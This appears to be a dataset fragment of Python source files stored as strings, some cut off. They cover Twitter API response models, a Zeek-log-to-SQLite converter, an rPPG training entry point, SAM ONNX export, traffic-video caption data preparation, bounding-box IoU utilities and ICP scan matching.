    "from typing import List, Optional, Any, Dict\n\nfrom pydantic import BaseModel, field_validator\nfrom twitter_api.errors import IncorrectData\n\n\nclass MediaEntity(BaseModel):\n    media_id: int\n    tagged_users: List[str] | None = []\n\n    @field_validator(\"tagged_users\")\n    @classmethod\n    def validate_users(cls, users: List[str]):\n        if users:\n            if len(users) > 10:\n                raise IncorrectData(\"Maximum 10 tagged users allowed\")\n\n        return users\n\n\nclass CreateTweetData(BaseModel):\n    text: str\n    media_entities: List[MediaEntity] | None = None\n\n\nclass Legacy(BaseModel):\n    can_dm: Optional[bool]\n    can_media_tag: Optional[bool]\n    created_at: Optional[str]\n    default_profile: Optional[bool]\n    default_profile_image: Optional[bool]\n    description: Optional[str]\n    entities: Optional[Dict[str, Any]]\n    fast_followers_count: Optional[int]\n    favourites_count: Optional[int]\n    followers_count: Optional[int]\n    friends_count: Optional[int]\n    has_custom_timelines: Optional[bool]\n    is_translator: Optional[bool]\n    listed_count: Optional[int]\n    location: Optional[str]\n    media_count: Optional[int]\n    name: Optional[str]\n    needs_phone_verification: Optional[bool]\n    normal_followers_count: Optional[int]\n    pinned_tweet_ids_str: Optional[List[str]]\n    possibly_sensitive: Optional[bool]\n    profile_image_url_https: Optional[str]\n    profile_interstitial_type: Optional[str]\n    screen_name: Optional[str]\n    statuses_count: Optional[int]\n    translator_type: Optional[str]\n    verified: Optional[bool]\n    want_retweets: Optional[bool]\n    withheld_in_countries: Optional[List[str]]\n\n\nclass UserResult(BaseModel):\n    __typename: Optional[str]\n    id: Optional[str]\n    rest_id: Optional[str]\n    affiliates_highlighted_label: Optional[Dict[str, Any]]\n    has_graduated_access: Optional[bool]\n    is_blue_verified: Optional[bool]\n    profile_image_shape: Optional[str]\n    legacy: Optional[Legacy]\n    smart_blocked_by: Optional[bool]\n    smart_blocking: Optional[bool]\n\n\nclass Result(BaseModel):\n    result: Optional[UserResult]\n\n\nclass Core(BaseModel):\n    user_results: Optional[Result]\n\n\nclass Views(BaseModel):\n    state: Optional[str]\n\n\nclass Entities(BaseModel):\n    user_mentions: Optional[List[Any]]\n    urls: Optional[List[Any]]\n    hashtags: Optional[List[Any]]\n    symbols: Optional[List[Any]]\n\n\nclass Legacy2(BaseModel):\n    bookmark_count: Optional[int]\n    bookmarked: Optional[bool]\n    created_at: Optional[str]\n    conversation_id_str: Optional[str]\n    display_text_range: Optional[List[int]]\n    entities: Optional[Entities]\n    favorite_count: Optional[int]\n    favorited: Optional[bool]\n    full_text: Optional[str]\n    is_quote_status: Optional[bool]\n    lang: Optional[str]\n    quote_count: Optional[int]\n    reply_count: Optional[int]\n    retweet_count: Optional[int]\n    retweeted: Optional[bool]\n    user_id_str: Optional[str]\n    id_str: Optional[str]\n\n\nclass EditControl(BaseModel):\n    edit_tweet_ids: Optional[List[str]]\n    editable_until_msecs: Optional[str]\n    is_edit_eligible: Optional[bool]\n    edits_remaining: Optional[str]\n\n\nclass QuickPromoteEligibility(BaseModel):\n    eligibility: Optional[str]\n\n\nclass UnmentionData(BaseModel):\n    pass\n\n\nclass UnmentionInfo(BaseModel):\n    pass\n\n\nclass CreateTweetResult(BaseModel):\n    rest_id: Optional[str]\n    has_birdwatch_notes: Optional[bool]\n    core: Optional[Core]\n    unmention_data: Optional[UnmentionData]\n    edit_control: Optional[EditControl]\n    is_translatable: Optional[bool]\n    views: Optional[Views]\n    source: Optional[str]\n    legacy: Optional[Legacy2]\n    quick_promote_eligibility: Optional[QuickPromoteEligibility]\n    unmention_info: Optional[UnmentionInfo]\n\n\nclass CreateTweetResultDataV3(BaseModel):\n    result: Optional[CreateTweetResult]\n\n\nclass CreateTweetResultDataV2(BaseModel):\n    tweet_results: Optional[CreateTweetResultDataV3]\n\n\nclass CreateTweetResultDataV1(BaseModel):\n    create_tweet: Optional[CreateTweetResultDataV2]\n\n\nclass CreateTweetResultData(BaseModel):\n    data: Optional[CreateTweetResultDataV1]\n",
    "#!/usr/bin/python3\nimport sqlite3\nimport os\nimport csv\n\ndef create_table_from_log(cursor, table_name, columns):\n    if not columns:  # Check if the columns list is empty\n        raise ValueError(f\"No columns found for table {table_name}\")\n    column_definitions = ', '.join([f'\"{col}\" TEXT' for col in columns])\n    create_table_sql = f'CREATE TABLE IF NOT EXISTS \"{table_name}\" ({column_definitions});'\n    cursor.execute(create_table_sql)\n\ndef insert_data_from_log(cursor, table_name, columns, data):\n    placeholders = ', '.join(['?' for _ in columns])\n    column_names = ', '.join([f'\"{col}\"' for col in columns])\n    insert_sql = f'INSERT INTO \"{table_name}\" ({column_names}) VALUES ({placeholders});'\n    cursor.executemany(insert_sql, data)\n\ndef convert_zeek_logs_to_sqlite(db_name, directory):\n    conn = sqlite3.connect(db_name)\n    cursor = conn.cursor()\n\n    for filename in os.listdir(directory):\n        if filename.endswith(\".log\"):\n            table_name = os.path.splitext(filename)[0].replace('-', '_')  # Ensure table names are valid SQLite identifiers\n            log_path = os.path.join(directory, filename)\n\n            with open(log_path, 'r') as file:\n                reader = csv.reader(file, delimiter='\\t')\n                columns = []\n                for row in reader:\n                    if row[0].startswith('#fields'):\n                        columns = [col.replace('.', '_') for col in row[1:]]  # Adjusted to handle '#fields'\n                        break  # Stop after finding the columns\n\n                if not columns:\n                    print(f\"No columns extracted for {filename}.\")\n                    continue\n\n                create_table_from_log(cursor, table_name, columns)\n\n                data = [row for row in reader if not row[0].startswith('#')]  # Skip comment lines\n                insert_data_from_log(cursor, table_name, columns, data)\n\n    conn.commit()\n    conn.close()\n\n# Example usage\ndirectory_path = '/data/'  # Update this to the path of your Zeek log files\ndb_name = 'zeek_logs.db'\nconvert_zeek_logs_to_sqlite(db_name, directory_path)\n\n",
    "\"\"\" The main function of rPPG deep learning pipeline.\"\"\"\n\nimport argparse\nimport random\nimport time\n\nimport numpy as np\nimport torch\nfrom config import get_config\nfrom dataset import data_loader\nfrom neural_methods import trainer\nfrom unsupervised_methods.unsupervised_predictor import unsupervised_predict\nfrom torch.utils.data import DataLoader\nimport os \n\nRANDOM_SEED = 100\ntorch.manual_seed(RANDOM_SEED)\ntorch.cuda.manual_seed(RANDOM_SEED)\ntorch.cuda.manual_seed_all(RANDOM_SEED)\nnp.random.seed(RANDOM_SEED)\nrandom.seed(RANDOM_SEED)\ntorch.backends.cudnn.deterministic = True\ntorch.backends.cudnn.benchmark = False\n# Create a general generator for use with the validation dataloader,\n# the test dataloader, and the unsupervised dataloader\ngeneral_generator = torch.Generator()\ngeneral_generator.manual_seed(RANDOM_SEED)\n# Create a training generator to isolate the train dataloader from\n# other dataloaders and better control non-deterministic behavior\ntrain_generator = torch.Generator()\ntrain_generator.manual_seed(RANDOM_SEED)\n\n\ndef seed_worker(worker_id):\n    worker_seed = torch.initial_seed() % 2 ** 32\n    np.random.seed(worker_seed)\n    random.seed(worker_seed)\n\n\ndef add_args(parser):\n    \"\"\"Adds arguments for parser.\"\"\"\n    parser.add_argument('--config_file', required=False,\n                        default=\"configs/train_configs/PURE_PURE_UBFC_TSCAN_BASIC.yaml\", type=str, help=\"The name of the model.\")\n    return parser\n\n\ndef train_and_test(config, data_loader_dict):\n    \"\"\"Trains the model.\"\"\"\n    if config.MODEL.NAME == \"Physnet\":\n        model_trainer = trainer.PhysnetTrainer.PhysnetTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == \"Tscan\":\n        model_trainer = trainer.TscanTrainer.TscanTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == \"EfficientPhys\":\n        model_trainer = trainer.EfficientPhysTrainer.EfficientPhysTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'DeepPhys':\n        model_trainer = trainer.DeepPhysTrainer.DeepPhysTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'BigSmall':\n        model_trainer = trainer.BigSmallTrainer.BigSmallTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'PhysFormer':\n        model_trainer = trainer.PhysFormerTrainer.PhysFormerTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'RhythmFormer':\n        model_trainer = trainer.RhythmFormerTrainer.RhythmFormerTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'RhythmMamba':\n        model_trainer = trainer.RhythmMambaTrainer.RhythmMambaTrainer(config, data_loader_dict)\n    else:\n        raise ValueError('Your Model is Not Supported  Yet!')\n    model_trainer.train(data_loader_dict)\n    model_trainer.test(data_loader_dict)\n\n\ndef test(config, data_loader_dict):\n    \"\"\"Tests the model.\"\"\"\n    if config.MODEL.NAME == \"Physnet\":\n        model_trainer = trainer.PhysnetTrainer.PhysnetTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == \"Tscan\":\n        model_trainer = trainer.TscanTrainer.TscanTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == \"EfficientPhys\":\n        model_trainer = trainer.EfficientPhysTrainer.EfficientPhysTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'DeepPhys':\n        model_trainer = trainer.DeepPhysTrainer.DeepPhysTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'BigSmall':\n        model_trainer = trainer.BigSmallTrainer.BigSmallTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'PhysFormer':\n        model_trainer = trainer.PhysFormerTrainer.PhysFormerTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'RhythmFormer':\n        model_trainer = trainer.RhythmFormerTrainer.RhythmFormerTrainer(config, data_loader_dict)\n    elif config.MODEL.NAME == 'RhythmMamba':\n        model_trainer = trainer.RhythmMambaTrainer.RhythmMambaTrainer(config, data_loader_dict)\n    else:\n        raise ValueError('Your Model is Not Supported  Yet!')\n    model_trainer.test(data_loader_dict)\n\n\ndef unsupervised_method_inference(config, data_loader):\n    if not config.UNSUPERVISED.METHOD:\n        raise ValueError(\"Please set unsupervised method in yaml!\")\n    for unsupervised_method in config.UNSUPERVISED.METHOD:\n        if unsupervised_method == \"POS\":\n            unsupervised_predict(config, data_loader, \"POS\")\n        elif unsupervised_method == \"CHROM\":\n            unsupervised_predict(config, data_loader, \"CHROM\")\n        elif unsupervised_method == \"ICA\":\n            unsupervised_predict(config, data_loader, \"ICA\")\n        elif unsupervised_method == \"GREEN\":\n            unsupervised_predict(config, data_loader, \"GREEN\")\n        elif unsupervised_method == \"LGI\":\n            unsupervised_predict(config, data_loader, \"LGI\")\n        elif unsupervised_method == \"PBV\":\n            unsupervised_predict(config, data_loader, \"PBV\")\n        else:\n            raise ValueError(\"Not supported unsupervised method!\")\n\n\nif __name__ == \"__main__\":\n    #os.environ[\"CUD",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n# All rights reserved.\n\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n\nfrom typing import Tuple\n\nimport torch\nimport torch.nn as nn\nfrom torch.nn import functional as F\n\nfrom ..modeling import Sam\nfrom .amg import calculate_stability_score\n\n\nclass SamOnnxModel(nn.Module):\n    \"\"\"\n    This model should not be called directly, but is used in ONNX export.\n    It combines the prompt encoder, mask decoder, and mask postprocessing of Sam,\n    with some functions modified to enable model tracing. Also supports extra\n    options controlling what information. See the ONNX export script for details.\n    \"\"\"\n\n    def __init__(\n        self,\n        model: Sam,\n        return_single_mask: bool,\n        use_stability_score: bool = False,\n        return_extra_metrics: bool = False,\n    ) -> None:\n        super().__init__()\n        self.mask_decoder = model.mask_decoder\n        self.model = model\n        self.img_size = model.image_encoder.img_size\n        self.return_single_mask = return_single_mask\n        self.use_stability_score = use_stability_score\n        self.stability_score_offset = 1.0\n        self.return_extra_metrics = return_extra_metrics\n\n    @staticmethod\n    def resize_longest_image_size(\n        input_image_size: torch.Tensor, longest_side: int\n    ) -> torch.Tensor:\n        input_image_size = input_image_size.to(torch.float32)\n        scale = longest_side / torch.max(input_image_size)\n        transformed_size = scale * input_image_size\n        transformed_size = torch.floor(transformed_size + 0.5).to(torch.int64)\n        return transformed_size\n\n    def _embed_points(\n        self, point_coords: torch.Tensor, point_labels: torch.Tensor\n    ) -> torch.Tensor:\n        point_coords = point_coords + 0.5\n        point_coords = point_coords / self.img_size\n        point_embedding = self.model.prompt_encoder.pe_layer._pe_encoding(point_coords)\n        point_labels = point_labels.unsqueeze(-1).expand_as(point_embedding)\n\n        point_embedding = point_embedding * (point_labels != -1)\n        point_embedding = (\n            point_embedding\n            + self.model.prompt_encoder.not_a_point_embed.weight * (point_labels == -1)\n        )\n\n        for i in range(self.model.prompt_encoder.num_point_embeddings):\n            point_embedding = (\n                point_embedding\n                + self.model.prompt_encoder.point_embeddings[i].weight\n                * (point_labels == i)\n            )\n\n        return point_embedding\n\n    def _embed_masks(\n        self, input_mask: torch.Tensor, has_mask_input: torch.Tensor\n    ) -> torch.Tensor:\n        mask_embedding = has_mask_input * self.model.prompt_encoder.mask_downscaling(\n            input_mask\n        )\n        mask_embedding = mask_embedding + (\n            1 - has_mask_input\n        ) * self.model.prompt_encoder.no_mask_embed.weight.reshape(1, -1, 1, 1)\n        return mask_embedding\n\n    def mask_postprocessing(\n        self, masks: torch.Tensor, orig_im_size: torch.Tensor\n    ) -> torch.Tensor:\n        masks = F.interpolate(\n            masks,\n            size=(self.img_size, self.img_size),\n            mode=\"bilinear\",\n            align_corners=False,\n        )\n\n        prepadded_size = self.resize_longest_image_size(orig_im_size, self.img_size).to(\n            torch.int64\n        )\n        masks = masks[..., : prepadded_size[0], : prepadded_size[1]]  # type: ignore\n\n        orig_im_size = orig_im_size.to(torch.int64)\n        h, w = orig_im_size[0], orig_im_size[1]\n        masks = F.interpolate(masks, size=(h, w), mode=\"bilinear\", align_corners=False)\n        return masks\n\n    def select_masks(\n        self, masks: torch.Tensor, iou_preds: torch.Tensor, num_points: int\n    ) -> Tuple[torch.Tensor, torch.Tensor]:\n        # Determine if we should return the multiclick mask or not from the number of points.\n        # The reweighting is used to avoid control flow.\n        score_reweight = torch.tensor(\n            [[1000] + [0] * (self.model.mask_decoder.num_mask_tokens - 1)]\n        ).to(iou_preds.device)\n        score = iou_preds + (num_points - 2.5) * score_reweight\n        best_idx = torch.argmax(score, dim=1)\n        masks = masks[torch.arange(masks.shape[0]), best_idx, :, :].unsqueeze(1)\n        iou_preds = iou_preds[torch.arange(masks.shape[0]), best_idx].unsqueeze(1)\n\n        return masks, iou_preds\n\n    @torch.no_grad()\n    def forward(\n        self,\n        image_embeddings: torch.Tensor,\n        point_coords: torch.Tensor,\n        point_labels: torch.Tensor,\n        mask_input: torch.Tensor,\n        has_mask_input: torch.Tensor,\n        orig_im_size: torch.Tensor,\n    ):\n        sparse_embedding = self._embed_points(point_coords, point_labels)\n        dense_embedding = self._embed_masks(mask_input, has_mask_input)\n\n        masks, scores = self.model.mask_decoder.predict_masks(\n            image_embeddings=image_embeddings,\n     ",
    "import os\nimport sys\nimport argparse\nfrom tqdm import tqdm\nfrom os.path import join as osp \nsys.path.append('../../utils')\nfrom utils import phase2num, num2phase, load_json, save_json, get_question_data, get_rewrite_data     \n\ndef process_information_phases(path):\n    information_phases = load_json(path)\n    information_dict = dict()\n    for information_phase in information_phases:\n        if information_phase['labels'][0].isdigit():\n            phase_number = information_phase['labels'][0]\n        else:\n            phase_number = phase2num[information_phase['labels'][0]]\n        information_dict[phase_number] = dict(pedes=information_phase['post_process_pedes_detail_extraction'], vehicle=information_phase['post_process_vehicle_detail_extraction'])\n\n    for phase_number in information_dict.keys():\n        for key in ['pedes', 'vehicle']: \n            for k, v in information_dict[phase_number][key].items():\n                information_dict[phase_number][key][k] = ' '.join(v).strip()\n    return information_dict\n\ndef convert_dict(data):\n    for k, v in data.items():\n        new_v = dict()\n        if v is not None:\n            for v_k, v_v in v.items():\n                if not v_k.isdigit():\n                    new_v[phase2num[v_k]] = v_v\n                else:\n                    new_v[v_k] = v_v\n            data[k] = new_v\n        else:\n            data[k] = v\n    return data\n\ndef main(args):\n    type = args.type\n    root = '../../../dataset'\n    root_output_dir = '../../../aux_dataset/extracted_frames/internal/vehicle_view'\n    save_folder = '../../../aux_dataset/train_data/internal/vehicle_view'\n    \n    os.makedirs('../../../aux_dataset/train_data/internal', exist_ok=True)\n    os.makedirs(save_folder, exist_ok=True)\n    \n    # Video frame properties\n    width = 1920\n    height = 1080\n\n    if type == 'all':\n        types = ['train', 'val']\n    else:\n        types = [type]\n    \n    for type in types:\n        print(f\"Start creating data for: {type} set\")\n        \n        anno_root = osp(root, 'annotations')\n        video_roots = [osp(root, f'videos/{type}'), osp(root, f'videos/{type}/normal_trimmed')]\n        caption_anno_roots = [osp(anno_root, f'caption/{type}'), osp(anno_root, f'caption/{type}/normal_trimmed')]\n        bbox_anno_roots = [osp(anno_root, f'bbox_annotated', 'pedestrian', type), osp(anno_root, f'bbox_annotated', 'pedestrian', type, 'normal_trimmed')]\n        output_dir = osp(root_output_dir, type)\n        \n        # Convert output_dir to abs path\n        output_dir = os.path.abspath(output_dir)\n\n        if args.choice == 'segment':\n            pedes_data = {'appearance':dict(id=0, data=[]), 'environment':dict(id=0, data=[]), 'location':dict(id=0, data=[]), 'attention':dict(id=0, data=[])}\n            vehicle_data = {'appearance':dict(id=0, data=[]), 'environment':dict(id=0, data=[]), 'location':dict(id=0, data=[]), 'action':dict(id=0, data=[])}\n        else:\n            pedes_result = {}\n            for segment_type in ['appearance', 'environment', 'location', 'attention']:\n                pedes_result[segment_type] = convert_dict(load_json(f\"../../../aux_dataset/results/{type}/internal/vehicle_view/pedes_{segment_type}.json\"))\n            rewrite_pedes_data = dict(id=0, data=[])\n            \n            vehicle_result = {}\n            for segment_type in ['appearance', 'environment', 'location', 'action']:\n                vehicle_result[segment_type] = convert_dict(load_json(f\"../../../aux_dataset/results/{type}/internal/vehicle_view/vehicle_{segment_type}.json\"))\n            rewrite_vehicle_data = dict(id=0, data=[])\n            \n        for caption_anno_root, bbox_anno_root, video_root in zip(caption_anno_roots, bbox_anno_roots, video_roots):\n            video_paths = os.listdir(video_root)\n            for video_name in tqdm(video_paths):\n                try:\n                    caption_anno = load_json(osp(caption_anno_root, video_name, 'vehicle_view', video_name) + '_caption.json')\n                except:\n                    print(f'Error loading caption json for {video_name}')\n                    continue\n                \n                try:\n                    bounding_box_anno = load_json(osp(bbox_anno_root, video_name, 'vehicle_view', video_name + '_vehicle_view_bbox.json'))['annotations']\n                except:\n                    print(f'Error loading bounding box json for {video_name}')\n                    continue\n            \n                # Process phase bounding box\n                bounding_box_dict = dict()\n                for bb in bounding_box_anno:\n                    phase_number = str(bb['phase_number'])\n                    bounding_box_dict[phase_number] = bb\n\n                # Process phase annotation\n                phase_captions = dict()\n                for e in caption_anno['event_phase']:\n                    if e['labels'][0].isdigit():\n                        phase_number = str(e['labels'][0])\n                    else:\n                        phase_number = phas",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\n\"\"\" Helper functions for calculating 2D and 3D bounding box IoU.\n\nCollected and written by Charles R. Qi\nLast modified: Jul 2019\n\"\"\"\nfrom __future__ import print_function\n\nimport numpy as np\nfrom scipy.spatial import ConvexHull\n\n\ndef polygon_clip(subjectPolygon, clipPolygon):\n    \"\"\"Clip a polygon with another polygon.\n\n    Ref: https://rosettacode.org/wiki/Sutherland-Hodgman_polygon_clipping#Python\n\n    Args:\n      subjectPolygon: a list of (x,y) 2d points, any polygon.\n      clipPolygon: a list of (x,y) 2d points, has to be *convex*\n    Note:\n      **points have to be counter-clockwise ordered**\n\n    Return:\n      a list of (x,y) vertex point for the intersection polygon.\n    \"\"\"\n\n    def inside(p):\n        return (cp2[0] - cp1[0]) * (p[1] - cp1[1]) > (cp2[1] - cp1[1]) * (\n            p[0] - cp1[0]\n        )\n\n    def computeIntersection():\n        dc = [cp1[0] - cp2[0], cp1[1] - cp2[1]]\n        dp = [s[0] - e[0], s[1] - e[1]]\n        n1 = cp1[0] * cp2[1] - cp1[1] * cp2[0]\n        n2 = s[0] * e[1] - s[1] * e[0]\n        n3 = 1.0 / (dc[0] * dp[1] - dc[1] * dp[0])\n        return [(n1 * dp[0] - n2 * dc[0]) * n3, (n1 * dp[1] - n2 * dc[1]) * n3]\n\n    outputList = subjectPolygon\n    cp1 = clipPolygon[-1]\n\n    for clipVertex in clipPolygon:\n        cp2 = clipVertex\n        inputList = outputList\n        outputList = []\n        s = inputList[-1]\n\n        for subjectVertex in inputList:\n            e = subjectVertex\n            if inside(e):\n                if not inside(s):\n                    outputList.append(computeIntersection())\n                outputList.append(e)\n            elif inside(s):\n                outputList.append(computeIntersection())\n            s = e\n        cp1 = cp2\n        if len(outputList) == 0:\n            return None\n    return outputList\n\n\ndef poly_area(x, y):\n    \"\"\"Ref: http://stackoverflow.com/questions/24467972/calculate-area-of-polygon-given-x-y-coordinates\"\"\"\n    return 0.5 * np.abs(np.dot(x, np.roll(y, 1)) - np.dot(y, np.roll(x, 1)))\n\n\ndef convex_hull_intersection(p1, p2):\n    \"\"\"Compute area of two convex hull's intersection area.\n    p1,p2 are a list of (x,y) tuples of hull vertices.\n    return a list of (x,y) for the intersection and its volume\n    \"\"\"\n    inter_p = polygon_clip(p1, p2)\n    if inter_p is not None:\n        hull_inter = ConvexHull(inter_p)\n        return inter_p, hull_inter.volume\n    else:\n        return None, 0.0\n\n\ndef box3d_vol(corners):\n    \"\"\"corners: (8,3) no assumption on axis direction\"\"\"\n    a = np.sqrt(np.sum((corners[0, :] - corners[1, :]) ** 2))\n    b = np.sqrt(np.sum((corners[1, :] - corners[2, :]) ** 2))\n    c = np.sqrt(np.sum((corners[0, :] - corners[4, :]) ** 2))\n    return a * b * c\n\n\ndef is_clockwise(p):\n    x = p[:, 0]\n    y = p[:, 1]\n    return np.dot(x, np.roll(y, 1)) - np.dot(y, np.roll(x, 1)) > 0\n\n\ndef box3d_iou(corners1, corners2):\n    \"\"\"Compute 3D bounding box IoU.\n\n    Input:\n        corners1: numpy array (8,3), assume up direction is negative Y\n        corners2: numpy array (8,3), assume up direction is negative Y\n    Output:\n        iou: 3D bounding box IoU\n        iou_2d: bird's eye view 2D bounding box IoU\n\n    todo (rqi): add more description on corner points' orders.\n    \"\"\"\n    # corner points are in counter clockwise order\n    rect1 = [(corners1[i, 0], corners1[i, 2]) for i in range(3, -1, -1)]\n    rect2 = [(corners2[i, 0], corners2[i, 2]) for i in range(3, -1, -1)]\n    area1 = poly_area(np.array(rect1)[:, 0], np.array(rect1)[:, 1])\n    area2 = poly_area(np.array(rect2)[:, 0], np.array(rect2)[:, 1])\n    inter, inter_area = convex_hull_intersection(rect1, rect2)\n    iou_2d = inter_area / (area1 + area2 - inter_area)\n    ymax = min(corners1[0, 1], corners2[0, 1])\n    ymin = max(corners1[4, 1], corners2[4, 1])\n    inter_vol = inter_area * max(0.0, ymax - ymin)\n    vol1 = box3d_vol(corners1)\n    vol2 = box3d_vol(corners2)\n    iou = inter_vol / (vol1 + vol2 - inter_vol)\n    return iou, iou_2d\n\n\ndef get_iou(bb1, bb2):\n    \"\"\"\n    Calculate the Intersection over Union (IoU) of two 2D bounding boxes.\n\n    Parameters\n    ----------\n    bb1 : dict\n        Keys: {'x1', 'x2', 'y1', 'y2'}\n        The (x1, y1) position is at the top left corner,\n        the (x2, y2) position is at the bottom right corner\n    bb2 : dict\n        Keys: {'x1', 'x2', 'y1', 'y2'}\n        The (x, y) position is at the top left corner,\n        the (x2, y2) position is at the bottom right corner\n\n    Returns\n    -------\n    float\n        in [0, 1]\n    \"\"\"\n    assert bb1[\"x1\"] < bb1[\"x2\"]\n    assert bb1[\"y1\"] < bb1[\"y2\"]\n    assert bb2[\"x1\"] < bb2[\"x2\"]\n    assert bb2[\"y1\"] < bb2[\"y2\"]\n\n    # determine the coordinates of the intersection rectangle\n    x_left = max(bb1[\"x1\"], bb2[\"x1\"])\n    y_top = max(bb1[\"y1\"], bb2[\"y1\"])\n    x_right = min(bb1[\"x2\"], bb2[\"x2\"])\n    y_bottom = min(bb1[\"y2\"], b",
    "#!/usr/bin/env python3\n#\n# MIT License\n# \n# Copyright (c) 2024 Naoki Akai\n# \n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n# \n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n# \n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\nimport sys\nimport math\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom scipy.spatial import KDTree\n\ndef read_scan_points(file):\n  fp = open(file, 'r')\n  points = []\n  for data in fp:\n    data = data.replace('\\n', '')\n    data = data.split(' ')\n    x = float(data[0])\n    y = float(data[1])\n    points.append([x, y])\n  fp.close()\n  return points\n\ndef compute_mean_and_covariance(points, indices):\n  x = 0.0\n  y = 0.0\n  num = len(indices)\n  for i in range(num):\n    x += points[indices[i]][0]\n    y += points[indices[i]][1]\n\n  mean = [x / float(num), y / float(num)]\n  vxx = 0.0\n  vxy = 0.0\n  vyy = 0.0\n  for i in range(num):\n    dx = points[indices[i]][0] - mean[0]\n    dy = points[indices[i]][1] - mean[1]\n    vxx += dx * dx\n    vxy += dx * dy\n    vyy += dy * dy\n  cov = np.array([[vxx / float(num), vxy / float(num)], \n                  [vxy / float(num), vyy / float(num)]])\n\n  return mean, cov\n\ndef compute_ndt_points(points):\n  N = 10\n  covs = []\n  tree = KDTree(points)\n  for i in range(len(points)):\n    query = np.array([points[i][0], points[i][1]])\n    dists, indices = tree.query(query, k=N)\n    mean, cov = compute_mean_and_covariance(points, indices)\n    points[i][0] = mean[0]\n    points[i][1] = mean[1]\n    covs.append(cov)\n  return points, covs\n\ndef make_transformation_matrix(tx, ty, theta):\n  mat = np.array([\n    [np.cos(theta), -np.sin(theta), tx],\n    [np.sin(theta), np.cos(theta), ty],\n    [0.0, 0.0, 1.0]\n  ])\n  return mat\n\ndef transform_points(mat, points):\n  for i in range(len(points)):\n    point = np.array([points[i][0], points[i][1], 1.0])\n    transformed_point = np.dot(mat, point)\n    points[i] = [transformed_point[0], transformed_point[1]]\n  return points\n\ndef skewd(v):\n  return np.array([v[1], -v[0]])\n\ndef expmap(v):\n  t = v[2]\n  c = np.cos(t)\n  s = np.sin(t)\n  if np.abs(t) < 1e-10:\n    V = np.eye(2)\n  else:\n    a = (1.0 - c) / t\n    V = np.array([[s / t, -a], [a, s / t]])\n  R = np.array([[c, -s], [s, c]])\n  u = np.array([v[0], v[1]])\n  t = np.dot(V, u)\n  T = np.eye(3)\n  T[:2, :2] = R\n  T[0, 2] = t[0]\n  T[1, 2] = t[1]\n  return T\n\ndef plot_points(points1, points2, title, block):\n  # if not hasattr(plot_points, \"first_call\"):\n  #   plot_points.first_call = True\n\n  x1, y1 = zip(*points1)\n  x2, y2 = zip(*points2)\n  plt.clf()\n  plt.xlim(-10.0, 15.0)\n  plt.ylim(-10.0, 15.0)\n  plt.scatter(x2, y2, color='blue', label='Target points', s=20)\n  plt.scatter(x1, y1, color='red', label='Source points', s=10)\n  plt.legend()\n  plt.grid(True)\n  plt.title(title)\n  plt.xlabel('X [m]')\n  plt.ylabel('Y [m]')\n  plt.legend(loc='upper left', fontsize=12)\n  plt.show(block=block)\n  plt.draw()\n  plt.pause(0.2)\n\n  # if plot_points.first_call:\n  #   input(\"Press Enter to continue...\")\n  #   plot_points.first_call = False\n\ndef icp_scan_matching(trans_mat, source_points, target_points):\n  max_iter_num = 30\n  scan_step = 10\n  max_dist = 3.0\n  epsilon = 1e-4\n  kdtree = KDTree(target_points)\n  fp = open('icp_log.txt', 'w')\n\n  for iter_num in range(max_iter_num):\n    H = np.zeros((3, 3))\n    b = np.zeros(3)\n    R = trans_mat[:2, :2]\n    corresponding_points_num = 0\n    error_sum = 0.0\n\n    for i in range(0, len(source_points), scan_step):\n      point = np.array([source_points[i][0], source_points[i][1], 1.0])\n      transformed_point = np.dot(trans_mat, point)\n      query = [transformed_point[0], transformed_point[1]]\n      dist, idx = kdtree.query(query)\n      if dist > max_dist:\n        continue\n\n      target = target_points[idx]\n      error = np.array([target[0] - query[0], target[1] - query[1], 0.0])\n      error_sum += math.sqrt(np.dot(error, error))\n      v = np.dot(R, skewd(source_points[i]))\n      J = np.zeros((3, 3))\n      J[0:2, 0:2] = -R\n      J[0, 2] = v[0]\n      J[1, 2] = v[1]\n      H += np.dot(J.T, J)\n      b += np.dot(J.T, error)\n      corresponding_points_num += 1\n\n    error_ave = error_sum / float(cor",
